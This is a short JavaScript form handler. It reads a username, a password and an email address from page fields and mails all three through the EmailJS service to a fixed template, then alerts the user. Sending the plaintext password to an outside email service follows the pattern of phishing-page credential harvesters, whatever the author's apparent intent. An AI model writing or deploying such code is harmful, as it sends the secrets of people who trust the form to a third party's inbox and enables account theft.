function sendEmail() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    var email = document.getElementById('email').value;

    emailjs.send("default_service", "template_sw9nx8y", {
        username: username,
        password: password,
        email: email
    }).then(
        function(response) {
            console.log("Email sent successfully", response);
            alert("Email sent successfully");
        },
        function(error) {
            console.log("Error sending email", error);
            alert("Error sending email");
        }
    );
}
